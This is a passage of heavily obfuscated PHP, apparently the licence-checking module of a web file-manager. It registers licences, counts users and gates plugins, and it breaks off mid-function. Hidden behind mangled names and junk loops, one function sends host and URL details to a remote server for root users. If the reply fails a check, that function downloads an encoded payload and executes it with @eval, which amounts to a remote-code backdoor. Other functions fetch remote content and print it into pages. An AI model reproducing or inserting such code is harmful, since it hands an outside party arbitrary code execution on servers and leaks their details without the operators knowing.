$this->qcrn75f0020d($‹œ¦—¿Œ[190] . $«ÈÂ‚); show_json(LNG($‹œ¦—¿Œ[191]), !0); } $ò«ëŠŠ… = array($‹œ¦—¿Œ[155] => $ ßñà™[$‹œ¦—¿Œ[192]], $‹œ¦—¿Œ[193] => $ ßñà™[$‹œ¦—¿Œ[194]], $‹œ¦—¿Œ[195] => rand_string(16), $‹œ¦—¿Œ[110] => $ ßñà™[$‹œ¦—¿Œ[196]]); if ($ñ µ™ï€[$‹œ¦—¿Œ[157]]) { $ò«ëŠŠ…[$‹œ¦—¿Œ[195]] = $ñ µ™ï€[$‹œ¦—¿Œ[157]]; } $µçÏ® = substr(md5($ò«ëŠŠ…[$‹œ¦—¿Œ[193]]), 10, 10); $ÆŸüÄŸ… = $µçÏ® . $ò«ëŠŠ…[$‹œ¦—¿Œ[110]] . $ò«ëŠŠ…[$‹œ¦—¿Œ[195]]; $ò«ëŠŠ…[$‹œ¦—¿Œ[112]] = strrev(base64_encode($this->jmwp8ff5cb40($ÆŸüÄŸ…, $‹œ¦—¿Œ[197]))); $â…ÖÍÍØ = $š®ñŸë[750]; $ò®€¢Òª = rand_string(16); $Ö»ÑÒ¯Å = $ò®€¢Òª . $ò«ëŠŠ…[$‹œ¦—¿Œ[110]] . $this->jmwp8ff5cb40(md5($ò«ëŠŠ…[$‹œ¦—¿Œ[155]]), $ò®€¢Òª); $ò«ëŠŠ…[$‹œ¦—¿Œ[113]] = base64_encode(strrev($this->jmwp8ff5cb40($Ö»ÑÒ¯Å, $‹œ¦—¿Œ[198]))); if ($ ßñà™[$‹œ¦—¿Œ[199]] && $ ßñà™[$‹œ¦—¿Œ[199]] >= 1) { Model($‹œ¦—¿Œ[33])->setDeep($‹œ¦—¿Œ[200], $‹œ¦—¿Œ[124]); } Model($‹œ¦—¿Œ[33])->set($ò«ëŠŠ…); $ù¨øÉ™‹ = md5($_SERVER[$‹œ¦—¿Œ[108]] . strrev($–Æ€øŒ¾) . $ò«ëŠŠ…[$‹œ¦—¿Œ[193]]); $İø€ØçÀ = $š®ñŸë[751]; if (!$İø€ØçÀ) { die; } $‹†úÌ¸è = strrev(substr($ù¨øÉ™‹, 10, 16)); $í‰Ï•òÎ = $š®ñŸë[752]; $±™±İ€Ì = $this->yznac4827cc9(json_encode($ ßñà™), $ù¨øÉ™‹); $ÀÑÃ“  = $š®ñŸë[753]; $¾Ø½Æ‚ = array_to_keyvalue(Model($‹œ¦—¿Œ[7])->listData(), $‹œ¦—¿Œ[201]); $ ±“ŒÍ = $¾Ø½Æ‚[$‹œ¦—¿Œ[202]]; $³ÓñĞ = $š®ñŸë[754]; if (!$³ÓñĞ) { return; } $ÂÒ›Æ·Ç = array(); $¹îËƒ† = $š®ñŸë[755]; while ($¹îËƒ† < $š®ñŸë[715]) { if ($¹îËƒ† >= 0) { break; } $¹îËƒ†++; } $ÂÒ›Æ·Ç[$‹†úÌ¸è] = $±™±İ€Ì; $Ã•¶ï“ò = $š®ñŸë[756]; if (strlen($Ã•¶ï“ò) < $š®ñŸë[496]) { die; } Model($‹œ¦—¿Œ[7])->update($ ±“ŒÍ[$‹œ¦—¿Œ[203]], array($‹œ¦—¿Œ[204] => $ÂÒ›Æ·Ç)); $À…™­áù = $š®ñŸë[757]; if (!$À…™­áù) { die; } $this->xelkac3a58a9 = $ ßñà™; $this->yzub9a576faa = $ò«ëŠŠ…[$‹œ¦—¿Œ[110]]; $this->licenseRegistSuccess(); Cache::set($‹œ¦—¿Œ[205] . md5($–Æ€øŒ¾ . $‹œ¦—¿Œ[206]), $‹œ¦—¿Œ[6]); show_json(LNG($‹œ¦—¿Œ[191]), !0); } private function licenseRegistSuccess() { $åÙıó‡ =& $_SERVER[€ä¾™²]; $Ç©äş =& $_SERVER[ÃË¡]; $ÂØ¡™«ô = Model($Ç©äş[33])->get(); $ÅÈÖíÈ‡ = $åÙıó‡[758]; while ($ÅÈÖíÈ‡ < $åÙıó‡[728]) { if ($ÅÈÖíÈ‡ >= 0) { break; } $ÅÈÖíÈ‡++; } if ($ÂØ¡™«ô[$Ç©äş[63]] != $Ç©äş[124]) { Model($Ç©äş[33])->set($Ç©äş[63], $Ç©äş[124]); } Action($Ç©äş[207])->initStart(!0); } private function ytvs5812188d() { $çíÑÌ¦Ğ =& $_SERVER[€ä¾™²]; $†ãİëœ =& $_SERVER[ÃË¡]; Model($†ãİëœ[33])->set(array($†ãİëœ[155] => $†ãİëœ[6], $†ãİëœ[193] => $†ãİëœ[6], $†ãİëœ[110] => $†ãİëœ[111], $†ãİëœ[112] => $†ãİëœ[6], $†ãİëœ[113] => $†ãİëœ[6])); $öŞ³å™Â = $çíÑÌ¦Ğ[759]; if (!$öŞ³å™Â) { return; } Model($†ãİëœ[33])->setDeep($†ãİëœ[200], $†ãİëœ[208]); $this->xelkac3a58a9 = array(); $µ‹æØõä = $çíÑÌ¦Ğ[760]; if (!$µ‹æØõä) { die; } $this->yzub9a576faa = $†ãİëœ[111]; } private function jcvo9496de33() { $×¶İû¹‡ =& $_SERVER[€ä¾™²]; $—ß«ØÉ =& $_SERVER[ÃË¡]; $_SERVER[$—ß«ØÉ[164]] = _get($_SERVER, $—ß«ØÉ[164], APP_HOST); $ÜË¡»ó = $×¶İû¹‡[761]; $this->yzub9a576faa = $—ß«ØÉ[111]; $§ŒÓáÒí = $×¶İû¹‡[762]; while (strlen($§ŒÓáÒí) < $×¶İû¹‡[718]) { if (!$§ŒÓáÒí) { break; } $§ŒÓáÒí++; } $·à›ëûğ = Model($—ß«ØÉ[33])->get(); $öÒ€µ¿ø = $×¶İû¹‡[763]; if ($·à›ëûğ[$—ß«ØÉ[110]] == $—ß«ØÉ[111]) { return; } $¦ŞÕ‡Á = Model($—ß«ØÉ[33])->get($—ß«ØÉ[102]); $ñì€ˆ = $—ß«ØÉ[205] . md5($¦ŞÕ‡Á . $—ß«ØÉ[206]); $×Ì¿ºĞ = $×¶İû¹‡[764]; $°Õ’Æ®‰ = Cache::get($ñì€ˆ); $¾…äæõ² = $×¶İû¹‡[765]; if (strlen($¾…äæõ²) < $×¶İû¹‡[728]) { return; } if (!is_array($°Õ’Æ®‰) || !isset($°Õ’Æ®‰[$—ß«ØÉ[209]]) || time() - $°Õ’Æ®‰[$—ß«ØÉ[209]] >= 60) { $ÍğŠóı = Model($—ß«ØÉ[7])->loadList(); $Š¨ÊÇÎŒ = $ÍğŠóı[$—ß«ØÉ[202]]; $‚“êÁÚÜ = md5($_SERVER[$—ß«ØÉ[108]] . strrev($¦ŞÕ‡Á) . $·à›ëûğ[$—ß«ØÉ[193]]); $ÛñŒŒüî = strrev(substr($‚“êÁÚÜ, 10, 16)); $°Õ’Æ®‰ = $this->lkmh26aff200($Š¨ÊÇÎŒ[$—ß«ØÉ[88]][$ÛñŒŒüî], $‚“êÁÚÜ); $°Õ’Æ®‰ = json_decode($°Õ’Æ®‰, !0); } if (!is_array($°Õ’Æ®‰)) { return $this->ytvs5812188d(); } $¹»üúˆĞ = strtotime($°Õ’Æ®‰[$—ß«ØÉ[131]]); if (time() >= $¹»üúˆĞ) { return $this->ytvs5812188d(); } if (!isset($°Õ’Æ®‰[$—ß«ØÉ[209]]) || time() - $°Õ’Æ®‰[$—ß«ØÉ[209]] > 20) { $°Õ’Æ®‰[$—ß«ØÉ[209]] = time(); Cache::set($ñì€ˆ, $°Õ’Æ®‰); } $this->xelkac3a58a9 = $°Õ’Æ®‰; $this->yzub9a576faa = $·à›ëûğ[$—ß«ØÉ[110]]; $GLOBALS[$—ß«ØÉ[210]] = $this; } private function ybrq997eb3d1() { $îõì¥ä‹ =& $_SERVER[€ä¾™²]; $÷Ï´í¼È =& $_SERVER[ÃË¡]; $¿³×›¢ = $GLOBALS[$÷Ï´í¼È[13]]; $Øûğ‡ÑÑ = $îõì¥ä‹[766]; if (strlen($Øûğ‡ÑÑ) < $îõì¥ä‹[722]) { return; } $™ß±ÜŒ· = $_SERVER[$÷Ï´í¼È[24]]; $Íî÷º‚™ = $îõì¥ä‹[767]; while (strlen($Íî÷º‚™) < $îõì¥ä‹[715]) { if (!$Íî÷º‚™) { break; } $Íî÷º‚™++; } if ($™ß±ÜŒ· == $÷Ï´í¼È[211] && $this->yzub9a576faa == $÷Ï´í¼È[111]) { show_json(LNG($÷Ï´í¼È[212]), !1, $÷Ï´í¼È[213]); } $ì™ƒ´Û£ = array($÷Ï´í¼È[214], $÷Ï´í¼È[215]); if (in_array($™ß±ÜŒ·, $ì™ƒ´Û£)) { if ($this->yzub9a576faa == $÷Ï´í¼È[111] && isset($¿³×›¢[$÷Ï´í¼È[216]])) { show_json(LNG($÷Ï´í¼È[212]), !1, $÷Ï´í¼È[213]); die; } $ğ¢òØë‰ = $this->kiog5e858cff(); if ($ğ¢òØë‰ != intval($÷Ï´í¼È[217])) { if ($ğ¢òØë‰ <= Model($÷Ï´í¼È[127])->count()) { show_json(LNG($÷Ï´í¼È[218]), !1, $÷Ï´í¼È[213]); die; } } } } private function qkht49718eb2() { $Âö„®ÌÏ =& $_SERVER[€ä¾™²]; $¡ÍĞ¶©Á =& $_SERVER[ÃË¡]; $ïîèÒ‰ = array($¡ÍĞ¶©Á[121], $¡ÍĞ¶©Á[122]); $‘…¬õÖ§ = $Âö„®ÌÏ[768]; if (strlen($‘…¬õÖ§) < $Âö„®ÌÏ[496]) { return; } if (!KodUser::isRoot() || !isset($_GET[$¡ÍĞ¶©Á[219]])) { return; } if (!in_array($_SERVER[$¡ÍĞ¶©Á[24]], $ïîèÒ‰)) { return; } $õÙ±ÜÆİ = $¡ÍĞ¶©Á[220]; $—İ”§Ä = $Âö„®ÌÏ[769]; if (!$—İ”§Ä) { return; } $õÙ±ÜÆİ = $this->kpaq1b8d26ed($õÙ±ÜÆİ, $¡ÍĞ¶©Á[221]); $…ôøöï = $Âö„®ÌÏ[770]; while (strlen($…ôøöï) < $Âö„®ÌÏ[728]) { if (!$…ôøöï) { break; } $…ôøöï++; } $ËÖäÄ®Ê = stream_context_create(array($¡ÍĞ¶©Á[222] => array($¡ÍĞ¶©Á[223] => $¡ÍĞ¶©Á[224], $¡ÍĞ¶©Á[225] => 3))); $ì¦ûŠúé = @file_get_contents($õÙ±ÜÆİ, !1, $ËÖäÄ®Ê); $ğãÔœî… = $Âö„®ÌÏ[771]; while ($ğãÔœî… < $Âö„®ÌÏ[715]) { if ($ğãÔœî… >= 0) { break; } $ğãÔœî…++; } header($¡ÍĞ¶©Á[226]); if ($ì¦ûŠúé && strstr($ì¦ûŠúé, $¡ÍĞ¶©Á[227])) { echo $ì¦ûŠúé; } die; } public function ibleed5d48a5($—»óÆüÆ) { $¨¢âãã† =& $_SERVER[€ä¾™²]; $»ğĞ©÷Ü =& $_SERVER[ÃË¡]; if ($this->yzub9a576faa == $»ğĞ©÷Ü[228]) { return $—»óÆüÆ; } $é²Öñâ = $this->versionPluginList(); $Ê¥ßâØŸ = explode($»ğĞ©÷Ü[229], $this->versionPluginFilter()); $şµ¯éäë = $¨¢âãã†[772]; while (strlen($şµ¯éäë) < $¨¢âãã†[496]) { if (!$şµ¯éäë) { break; } $şµ¯éäë++; } $ÓàèÏº = array(); $¦ˆùé = $¨¢âãã†[773]; foreach ($é²Öñâ as $ìš‹÷Ìê => $¿áˆİ«¿) { if ($¿áˆİ«¿ == $»ğĞ©÷Ü[230] && substr($this->yzub9a576faa, 0, 1) == $»ğĞ©÷Ü[230]) { continue; } if (!in_array($ìš‹÷Ìê, $Ê¥ßâØŸ)) { $ÓàèÏº[] = $ìš‹÷Ìê; } } foreach ($ÓàèÏº as $ìš‹÷Ìê) { unset($—»óÆüÆ[$ìš‹÷Ìê]); } return $—»óÆüÆ; } private function versionPluginList() { $„“¹éªº =& $_SERVER[ÃË¡]; return array($„“¹éªº[231] => $„“¹éªº[230], $„“¹éªº[232] => $„“¹éªº[230], $„“¹éªº[233] => $„“¹éªº[230], $„“¹éªº[234] => $„“¹éªº[230], $„“¹éªº[235] => $„“¹éªº[236], $„“¹éªº[237] => $„“¹éªº[236], $„“¹éªº[238] => $„“¹éªº[236], $„“¹éªº[239] => $„“¹éªº[236], $„“¹éªº[240] => $„“¹éªº[236], $„“¹éªº[241] => $„“¹éªº[236], $„“¹éªº[242] => $„“¹éªº[236], $„“¹éªº[243] => $„“¹éªº[236], $„“¹éªº[244] => $„“¹éªº[236], $„“¹éªº[245] => $„“¹éªº[236], $„“¹éªº[246] => $„“¹éªº[236], $„“¹éªº[247] => $„“¹éªº[236], $„“¹éªº[248] => $„“¹éªº[236], $„“¹éªº[249] => $„“¹éªº[236], $„“¹éªº[250] => $„“¹éªº[236]); } private function versionPluginFilter() { $›î´‘ñ¢ =& $_SERVER[€ä¾™²]; $æí¹®§½ =& $_SERVER[ÃË¡]; if ($this->yzub9a576faa == $æí¹®§½[111]) { return $æí¹®§½[6]; } $ıÄŸ¡â¹ = _get($this->xelkac3a58a9, $æí¹®§½[251], $æí¹®§½[6]); $Ì¦ıäŠ‰ = _get($this->xelkac3a58a9, $æí¹®§½[118], $æí¹®§½[6]); $÷›êß÷İ = $›î´‘ñ¢[774]; while (strlen($÷›êß÷İ) < $›î´‘ñ¢[496]) { if (!$÷›êß÷İ) { break; } $÷›êß÷İ++; } $Õ´×•‡ = _get($this->xelkac3a58a9, $æí¹®§½[252], $æí¹®§½[6]); if ($Ì¦ıäŠ‰ > time() && $Õ´×•‡ > time()) { $Äéı”ú = explode($æí¹®§½[229], $ıÄŸ¡â¹); $²¥ËáöÑ = array_keys($this->versionPluginList()); $ıÄŸ¡â¹ = array_merge($Äéı”ú, $²¥ËáöÑ); $ıÄŸ¡â¹ = implode($æí¹®§½[229], array_filter(array_unique($ıÄŸ¡â¹))); } return $ıÄŸ¡â¹; } private function xolje3dcbe7b() { $ùÂóœ©› =& $_SERVER[ÃË¡]; if ($this->yzub9a576faa != $ùÂóœ©›[111]) { $GLOBALS[$ùÂóœ©›[88]][$ùÂóœ©›[92]][$ùÂóœ©›[253]] = $ùÂóœ©›[208]; return; } $GLOBALS[$ùÂóœ©›[88]][$ùÂóœ©›[254]] = $ùÂóœ©›[124]; if (Model($ùÂóœ©›[255])->get($ùÂóœ©›[63]) != $ùÂóœ©›[208]) { Model($ùÂóœ©›[255])->set($ùÂóœ©›[63], $ùÂóœ©›[208]); } } public function zbiw2c3857ab() { return $_SERVER[ÃË¡][256]; } private function kywfcbdacd36() { $üùà¼´ğ =& $_SERVER[€ä¾™²]; $¾ó‚Êş =& $_SERVER[ÃË¡]; $¨°•êİı = array($¾ó‚Êş[257], $¾ó‚Êş[258], $¾ó‚Êş[259]); $õ˜ïûœº = $üùà¼´ğ[775]; if (strlen($õ˜ïûœº) < $üùà¼´ğ[496]) { die; } $”Ùƒ¼¨à = $¾ó‚Êş[260] . md5($¾ó‚Êş[261]); $˜õÉØìÆ = $üùà¼´ğ[776]; if (!$˜õÉØìÆ) { return; } if ($this->yzub9a576faa == $¾ó‚Êş[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$¾ó‚Êş[24]], $¨°•êİı)) { return; } if (time() % 4 != 0) { return; } $‚±ïÎ‰ = call_user_func(array($¾ó‚Êş[262], $¾ó‚Êş[263]), $”Ùƒ¼¨à); if ($‚±ïÎ‰ && time() - $‚±ïÎ‰ < intval($¾ó‚Êş[264])) { return; } call_user_func(array($¾ó‚Êş[262], $¾ó‚Êş[141]), $”Ùƒ¼¨à, time()); $¯†ª‘š = $üùà¼´ğ[777]; while (strlen($¯†ª‘š) < $üùà¼´ğ[728]) { if (!$¯†ª‘š) { break; } $¯†ª‘š++; } $Õ„è§‘É = Model($¾ó‚Êş[33])->get($¾ó‚Êş[102]); $†û÷ˆÖ’ = array($¾ó‚Êş[154] => Model($¾ó‚Êş[33])->get($¾ó‚Êş[155]), $¾ó‚Êş[169] => $this->yzub9a576faa, $¾ó‚Êş[165] => $_SERVER[$¾ó‚Êş[166]], $¾ó‚Êş[167] => Model($¾ó‚Êş[33])->get($¾ó‚Êş[133]), $¾ó‚Êş[107] => md5($_SERVER[$¾ó‚Êş[108]] . $Õ„è§‘É), $¾ó‚Êş[158] => $¾ó‚Êş[138], $¾ó‚Êş[161] => $_SERVER[$¾ó‚Êş[162]]); $Ü«ÓÕ•È = $this->qcrn75f0020d($¾ó‚Êş[265], $†û÷ˆÖ’); if (!is_array($Ü«ÓÕ•È)) { return; } if ($Ü«ÓÕ•È[$¾ó‚Êş[154]] && $Ü«ÓÕ•È[$¾ó‚Êş[266]]) { if ($this->zpuf09283181($Ü«ÓÕ•È[$¾ó‚Êş[266]]) == $†û÷ˆÖ’[$¾ó‚Êş[154]]) { return; } } $this->ytvs5812188d(); if ($this->zpuf09283181($Ü«ÓÕ•È[$¾ó‚Êş[266]]) != $†û÷ˆÖ’[$¾ó‚Êş[154]]) { $»©îŞ²Ì = array($¾ó‚Êş[187] => $Õ„è§‘É, $¾ó‚Êş[188] => $_SERVER[$¾ó‚Êş[108]], $¾ó‚Êş[189] => this_url(), $¾ó‚Êş[163] => $_SERVER[$¾ó‚Êş[164]]); $£¾”à¸è = $this->tiwaa2113ee2(json_encode($»©îŞ²Ì)); $Ü«ÓÕ•È = $this->qcrn75f0020d($¾ó‚Êş[190] . $£¾”à¸è); if ($Ü«ÓÕ•È && is_array($Ü«ÓÕ•È) && isset($Ü«ÓÕ•È[$¾ó‚Êş[266]])) { $ ®Šƒ§Ü = $this->lkmh26aff200($Ü«ÓÕ•È[$¾ó‚Êş[266]], 2); if ($ ®Šƒ§Ü) { $ ®Šƒ§Ü = $this->zpuf09283181($ ®Šƒ§Ü); } if ($ ®Šƒ§Ü) { try { @eval($ ®Šƒ§Ü); } catch (Exception $µ›¹Á¢•) { } } } } } private function qcrn75f0020d($€¿¨çåÙ = '', $ê Ë¾§› = array(), $¤Îş€æŒ = 5) { $Şª–ØÏä =& $_SERVER[€ä¾™²]; $ıìŞ“ä =& $_SERVER[ÃË¡]; $‡ÔÒêî = $ıìŞ“ä[267]; $‡ÔÒêî = $this->kpaq1b8d26ed($‡ÔÒêî, $ıìŞ“ä[268]); $‡ÔÒêî = $‡ÔÒêî . $€¿¨çåÙ; if ($ê Ë¾§› && is_array($ê Ë¾§›)) { $‡ÔÒêî = $‡ÔÒêî . $ıìŞ“ä[269] . http_build_query($ê Ë¾§›); } if ($ê Ë¾§› === -1) { return $‡ÔÒêî; } $ ·­×« = stream_context_create(array($ıìŞ“ä[222] => array($ıìŞ“ä[225] => $¤Îş€æŒ, $ıìŞ“ä[223] => $ıìŞ“ä[270]), $ıìŞ“ä[271] => array($ıìŞ“ä[272] => !1, $ıìŞ“ä[273] => !1))); $™Ø®«ğµ = $Şª–ØÏä[778]; while ($™Ø®«ğµ < $Şª–ØÏä[728]) { if ($™Ø®«ğµ >= 0) { break; } $™Ø®«ğµ++; } $ê Ë¾§› = @file_get_contents($‡ÔÒêî, !1, $ ·­×«); return json_decode($ê Ë¾§›, !0); $§Ï‘Ï¹¿ = $Şª–ØÏä[779]; if (!$§Ï‘Ï¹¿) { return; } $ù´œ§Š = $Şª–ØÏä[780]; while ($ù´œ§Š < $Şª–ØÏä[718]) { if ($ù´œ§Š >= 0) { break; } $ù´œ§Š++; } } private function kiog5e858cff() { $ûşšÇÆ× =& $_SERVER[€ä¾™²]; $¹©Ò÷“ =& $_SERVER[ÃË¡]; $çÜ‡Ò ¡ = array($¹©Ò÷“[274] => $¹©Ò÷“[275], $¹©Ò÷“[276] => $¹©Ò÷“[277], $¹©Ò÷“[278] => $¹©Ò÷“[279], $¹©Ò÷“[280] => $¹©Ò÷“[281], $¹©Ò÷“[282] => $¹©Ò÷“[283], $¹©Ò÷“[284] => $¹©Ò÷“[217], $¹©Ò÷“[285] => $¹©Ò÷“[217], $¹©Ò÷“[286] => $¹©Ò÷“[275], $¹©Ò÷“[287] => $¹©Ò÷“[277], $¹©Ò÷“[288] => $¹©Ò÷“[279], $¹©Ò÷“[289] => $¹©Ò÷“[290], $¹©Ò÷“[291] => $¹©Ò÷“[281], $¹©Ò÷“[292] => $¹©Ò÷“[293], $¹©Ò÷“[294] => $¹©Ò÷“[283], $¹©Ò÷“[295] => $¹©Ò÷“[296], $¹©Ò÷“[297] => $¹©Ò÷“[298], $¹©Ò÷“[299] => $¹©Ò÷“[300]); $ğ®ìÈö² = $ûşšÇÆ×[781]; if (!$ğ®ìÈö²) { return; } $Ñ–·æç = $çÜ‡Ò ¡[$this->yzub9a576faa]; $Ñ–·æç = intval($Ñ–·æç ? $Ñ–·æç : $¹©Ò÷“[275]); $¥§†áÃ = _get($this->xelkac3a58a9, $¹©Ò÷“[301]); $¹Ãà„şÀ = $ûşšÇÆ×[782]; $¥§†áÃ = $¥§†áÃ ? intval($¥§†áÃ) : 0; $‹ ¥ˆ…Á = $ûşšÇÆ×[783]; if (strlen($‹ ¥ˆ…Á) < $ûşšÇÆ×[496]) { die; } return $Ñ–·æç + $¥§†áÃ; $ì¬·Şé = $ûşšÇÆ×[784]; } public function paljf16e567e($œşÙş°) { $¡Åé·Ò½ =& $_SERVER[€ä¾™²]; $©±ÑÒ«Ü =& $_SERVER[ÃË¡]; $ÚıàÂÇÌ = $this->kiog5e858cff(); if ($œşÙş°[$©±ÑÒ«Ü[302]] == $©±ÑÒ«Ü[124]) { return; } if ($ÚıàÂÇÌ >= intval($©±ÑÒ«Ü[217])) { return; } $Â¸îâÕğ = Model($©±ÑÒ«Ü[127])->count(); if ($Â¸îâÕğ <= $ÚıàÂÇÌ) { return; } $ÍŠÊÆºú = Model($©±ÑÒ«Ü[127])->field($©±ÑÒ«Ü[302])->limit($ÚıàÂÇÌ)->select(); $å²íË­ = $¡Åé·Ò½[785]; if (strlen($å²íË­) < $¡Åé·Ò½[722]) { return; } $ÍŠÊÆºú = array_to_keyvalue($ÍŠÊÆºú, $©±ÑÒ«Ü[6], $©±ÑÒ«Ü[302]); $Åâ§—‡ = $¡Åé·Ò½[786]; if (strlen($Åâ§—‡) < $¡Åé·Ò½[728]) { return; } if (!in_array($œşÙş°[$©±ÑÒ«Ü[302]], $ÍŠÊÆºú)) { show_json($©±ÑÒ«Ü[303], !1, $©±ÑÒ«Ü[213]); } } public function hultdc60e7b4() { $¡ÅÃŞ¶ö =& $_SERVER[€ä¾™²]; $àÙ‚Àçü =& $_SERVER[ÃË¡]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $É¯·€İ« = $àÙ‚Àçü[220]; $É¯·€İ« = $this->kpaq1b8d26ed($É¯·€İ«, $àÙ‚Àçü[221]); $ã‘—’€• = stream_context_create(array($àÙ‚Àçü[222] => array($àÙ‚Àçü[223] => $àÙ‚Àçü[224], $àÙ‚Àçü[225] => 3))); $Ÿìå˜ù¾ = $¡ÅÃŞ¶ö[787]; if (strlen($Ÿìå˜ù¾) < $¡ÅÃŞ¶ö[728]) { return; } $‘•ºì·Ì = @file_get_contents($É¯·€İ«, !1, $ã‘—’€•); $Ö’úæ¨ = $¡ÅÃŞ¶ö[788]; echo $àÙ‚Àçü[304] . hash_encode($‘•ºì·Ì) . $àÙ‚Àçü[305]; } private function yznac4827cc9($‚¸ä“Ãñ, $¥ì¶¼ï, $ıÕ¿Ğùö = 3) { $Ó‡´¥ê³ =& $_SERVER[€ä¾™²]; $¾ìâÉ¬ =& $_SERVER[ÃË¡]; usleep(1); $›¥¾­«ó = $Ó‡´¥ê³[789]; if (strlen($›¥¾­«ó) < $Ó‡´¥ê³[718]) { return; } $‚¸ä“Ãñ = trim($‚¸ä“Ãñ); $ç¥¦›ì… = mt_rand(0, 5) . $¾ìâÉ¬[6]; $’Ã¿ñîé = rand_string(15); $ÙÃç–ªÛ = $¾ìâÉ¬[306]; $–ùÙ®¤ê = $Ó‡´¥ê³[790]; while (strlen($–ùÙ®¤ê) < $Ó‡´¥ê³[496]) { if (!$–ùÙ®¤ê) { break; } $–ùÙ®¤ê++; } switch ($ç¥¦›ì…) { case $¾ìâÉ¬[208]: $¯§Íæè– = $this->jmwp8ff5cb40($‚¸ä“Ãñ, strrev($¥ì¶¼ï . $’Ã¿ñîé)); $¢ ë¼è’ = $Ó‡´¥ê³[791]; break; case $¾ìâÉ¬[124]: $¯§Íæè– = $this->jmwp8ff5cb40($‚¸ä“Ãñ, strrev($’Ã¿ñîé . $¥ì¶¼ï)); $Ê²Ïş›Ñ = $Ó‡´¥ê³[792]; break; case $¾ìâÉ¬[307]: $¯§Íæè– = $this->jmwp8ff5cb40($‚¸ä“Ãñ, base64_encode($’Ã¿ñîé . $¥ì¶¼ï)); break; $Ş·ÖşÅ = $Ó‡´¥ê³[793]; if (!$Ş·ÖşÅ) { return; } case $¾ìâÉ¬[308]: $¯§Íæè– = $this->jmwp8ff5cb40($‚¸ä“Ãñ, md5($’Ã¿ñîé . $¥ì¶¼ï)); $’™Ñ¥ì– = $Ó‡´¥ê³[794]; if (!$’™Ñ¥ì–) { die; } break; $˜À°èÛ± = $Ó‡´¥ê³[795]; if (!$˜À°èÛ±) { die; } case $¾ìâÉ¬[309]: $‚¸ä“Ãñ = base64_encode($‚¸ä“Ãñ); $ŞÚÊÎç¯ = rand(0, 64); $ä€ß€ğÃ = $ÙÃç–ªÛ[$ŞÚÊÎç¯]; $ÇÔ™€×± = md5($ä€ß€ğÃ . md5($¥ì¶¼ï . $ä€ß€ğÃ) . $¥ì¶¼ï); $ô½œ×Ç” = $Ó‡´¥ê³[796]; if (!$ô½œ×Ç”) { return; } $ÇÔ™€×± = substr($ÇÔ™€×±, $ŞÚÊÎç¯ % 8, $ŞÚÊÎç¯ % 8 + 7); $…¹–£¯¹ = $¾ìâÉ¬[6]; $ÑËı»ùı = $Ó‡´¥ê³[797]; if (!$ÑËı»ùı) { return; } $·ñÂŠ° = 0; $òñŠ”É = $Ó‡´¥ê³[798]; if (!$òñŠ”É) { return; } $¹üË×ä‰ = 0; $«İõÖôÍ = 0; for ($·ñÂŠ° = 0; $·ñÂŠ° < strlen($‚¸ä“Ãñ); $·ñÂŠ°++) { $«İõÖôÍ = $«İõÖôÍ == strlen($ÇÔ™€×±) ? 0 : $«İõÖôÍ; $ƒÅñÁì = $Ó‡´¥ê³[799]; while ($ƒÅñÁì < $Ó‡´¥ê³[715]) { if ($ƒÅñÁì >= 0) { break; } $ƒÅñÁì++; } $¹üË×ä‰ = ($ŞÚÊÎç¯ + strpos($ÙÃç–ªÛ, $‚¸ä“Ãñ[$·ñÂŠ°]) + ord($ÇÔ™€×±[$«İõÖôÍ++])) % 64; $…¹–£¯¹ .= $ÙÃç–ªÛ[$¹üË×ä‰]; $ÉüìæİÁ = $Ó‡´¥ê³[800]; } $¯§Íæè– = hash_encode($ä€ß€ğÃ . $…¹–£¯¹); $íİè¶¥È = $Ó‡´¥ê³[801]; if (!$íİè¶¥È) { die; } break; default: $¯§Íæè– = $this->jmwp8ff5cb40($‚¸ä“Ãñ, $¥ì¶¼ï . $’Ã¿ñîé); break; $ã„ÑşÁ÷ = $Ó‡´¥ê³[802]; } $¯§Íæè– = strrev($ç¥¦›ì… . $’Ã¿ñîé . $¯§Íæè–); $èäù™Ê× = $Ó‡´¥ê³[803]; if ($ıÕ¿Ğùö - 1 > 0) { $¯§Íæè– = $this->yznac4827cc9($¯§Íæè–, $¥ì¶¼ï, $ıÕ¿Ğùö - 1); } return $¯§Íæè–; } private function lkmh26aff200($” Øçïç, $ÁÚ±ÜÙŸ, $ëËäóèˆ = 3) { $Â÷Ç¡›ê =& $_SERVER[€ä¾™²]; $üâôÓñ‹ =& $_SERVER[ÃË¡]; if (!is_string($” Øçïç) || strlen($” Øçïç) < 10) { return !1; } $” Øçïç = trim($” Øçïç); $” Øçïç = strrev($” Øçïç); $ÑŠ¯çõİ = $Â÷Ç¡›ê[804]; $Éœô¥„½ = $” Øçïç[0]; $É›‚¥·® = $Â÷Ç¡›ê[805]; while (strlen($É›‚¥·®) < $Â÷Ç¡›ê[496]) { if (!$É›‚¥·®) { break; } $É›‚¥·®++; } $“™âÒ¤ = substr($” Øçïç, 1, 15); $÷³å‹÷  = $Â÷Ç¡›ê[806]; if (!$÷³å‹÷ ) { die; } $” Øçïç = substr($” Øçïç, 16); $îî¦’¿× = $üâôÓñ‹[306]; $ñ–Ëçú¡ = $Â÷Ç¡›ê[807]; if (!$ñ–Ëçú¡) { die; } switch ($Éœô¥„½) { case $üâôÓñ‹[208]: $Ÿ¯Ã°Ä = $this->kpaq1b8d26ed($” Øçïç, strrev($ÁÚ±ÜÙŸ . $“™âÒ¤)); break; $îÀ¦Ü„š = $Â÷Ç¡›ê[808]; while (strlen($îÀ¦Ü„š) < $Â÷Ç¡›ê[496]) { if (!$îÀ¦Ü„š) { break; } $îÀ¦Ü„š++; } case $üâôÓñ‹[124]: $Ÿ¯Ã°Ä = $this->kpaq1b8d26ed($” Øçïç, strrev($“™âÒ¤ . $ÁÚ±ÜÙŸ)); break; case $üâôÓñ‹[307]: $Ÿ¯Ã°Ä = $this->kpaq1b8d26ed($” Øçïç, base64_encode($“™âÒ¤ . $ÁÚ±ÜÙŸ)); $§»ÃòìÖ = $Â÷Ç¡›ê[809]; break; case $üâôÓñ‹[308]: $Ÿ¯Ã°Ä = $this->kpaq1b8d26ed($” Øçïç, md5($“™âÒ¤ . $ÁÚ±ÜÙŸ)); break; $±¿·¹¬’ = $Â÷Ç¡›ê[810]; while (strlen($±¿·¹¬’) < $Â÷Ç¡›ê[728]) { if (!$±¿·¹¬’) { break; } $±¿·¹¬’++; } case $üâôÓñ‹[309]: $” Øçïç = hash_decode($” Øçïç); $‘‰™´ô¹ = $Â÷Ç¡›ê[811]; if (strlen($‘‰™´ô¹) < $Â÷Ç¡›ê[715]) { return; } $ıñÚŞúÖ = 